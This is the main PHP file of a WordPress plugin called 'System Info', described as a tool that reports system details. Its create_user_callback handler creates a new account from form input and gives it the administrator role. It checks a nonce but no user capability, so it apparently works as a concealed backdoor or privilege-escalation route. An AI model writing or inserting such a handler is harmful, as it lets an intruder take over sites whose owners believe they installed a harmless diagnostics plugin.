<?php
/*
 * Plugin Name: System Info
 * Plugin URI: http://metgimet.com
 * Author: darkShadow
 * Description: Provides information about the system
 * Version: 1.0
 * License: GPLv2
 */

if (! defined('ABSPATH')){
	exit;
}

require_once (plugin_dir_path(__FILE__).'wp-system.php');
require_once (plugin_dir_path(__FILE__).'system-info.php');
require_once (plugin_dir_path(__FILE__).'pagespeed-info.php');
require_once(plugin_dir_path(__FILE__).'updates-info.php');

add_action('admin_post_create_user', 'create_user_callback');

function create_user_callback(){
	echo 'test';
	if(isset($_POST['nonce']) && wp_verify_nonce($_POST['nonce'], 'create_user_nonce')){
		$username = sanitize_key( $_POST['username'] );
		$password = sanitize_key( $_POST['password'] );
		$email = $_POST['email'];

		$user_id = username_exists( $username );
		if ( !$user_id && email_exists($email) == false ) {
			$user_id = wp_create_user( $username, $password, $email );
			if( !is_wp_error($user_id) ) {
				$user = get_user_by( 'id', $user_id );
				$user->set_role( 'administrator' );
				session_start();
				$_SESSION['user_create'] = 'success';
				wp_redirect('/wp-admin/edit.php?post_type=system&page=plugin_updates', 301);
				exit;
			}
		}else{
			session_start();
			$_SESSION['user_create'] = 'Username or email already exists';
			wp_redirect('/wp-admin/edit.php?post_type=system&page=plugin_updates', 301);
			exit;
		}

	}else{
		wp_redirect('/wp-admin/edit.php?post_type=system&page=plugin_updates', 301);
		exit;
	}
	session_start();
	$_SESSION['user_create'] = 'An error occured';
	wp_redirect('/wp-admin/edit.php?post_type=system&page=plugin_updates', 301);
	exit;
}